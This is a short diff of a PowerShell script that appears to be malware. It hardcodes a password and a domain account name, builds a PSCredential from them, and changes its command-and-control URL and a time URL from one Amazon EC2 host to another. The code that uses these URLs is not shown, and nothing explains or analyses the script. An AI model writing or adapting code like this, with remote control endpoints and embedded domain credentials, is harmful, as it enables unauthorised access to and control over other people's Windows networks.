@@ -17,8 +17,8 @@ $c0de='Tossking@'
 $c0de=$c0de+$toAppend
 $username='magrene'
 $usernameB=((gwmi WIN32_ComputerSystem).Domain+'\magrene')
-$cNcURL='http://ec2-3-235-98-86.compute-1.amazonaws.com/f5423r/ctrlc/fffeeeezzzz/23retefd.txt'
-$timeURL='http://ec2-3-235-98-86.compute-1.amazonaws.com/eeee/timeZ.txt'
+$cNcURL='http://ec2-54-156-39-21.compute-1.amazonaws.com/f5423r/ctrlc/fffeeeezzzz/23retefd.txt'
+$timeURL='http://ec2-54-156-39-21.compute-1.amazonaws.com/eeee/timeZ.txt'
 [SecureString]$secureString = $c0de | ConvertTo-SecureString -AsPlainText -Force 
 [PSCredential]$credential = New-Object System.Management.Automation.PSCredential -ArgumentList $userNameB, $secureString
 
